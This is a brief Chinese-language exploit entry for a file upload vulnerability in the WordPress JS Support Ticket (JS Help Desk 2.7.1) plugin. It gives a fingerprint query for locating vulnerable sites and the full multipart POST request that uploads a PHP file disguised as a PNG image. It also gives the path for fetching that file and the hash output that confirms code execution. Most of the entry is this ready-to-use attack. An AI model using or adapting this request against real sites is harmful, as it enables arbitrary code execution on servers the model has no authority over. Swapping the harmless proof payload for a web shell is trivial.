# WordPressjs-support-ticket存在文件上传漏洞

- **系统**：WordPress　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="wp-content/plugins/js-support-ticket"`
- **请求**：`POST /wp-admin/?page=configuration&task=saveconfiguration HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=--------767099171`

**请求体 / payload**
```
----------767099171
Content-Disposition: form-data; name="action"
configuration_saveconfiguration
----------767099171
Content-Disposition: form-data; name="form_request"
jssupportticket
----------767099171
Content-Disposition: form-data; name="support_custom_img"; filename="test1.php"
Content-Type: image/png
<?php echo md5(123);unlink(__FILE__);?>
----------767099171--

上传文件位置
GET /wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/test1.php HTTP/1.1
Host:
202cb962ac59075b964b07152d234b70
```

**其他**
- WordPress js-support-ticket存在文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * JS Help Desk 2.7.1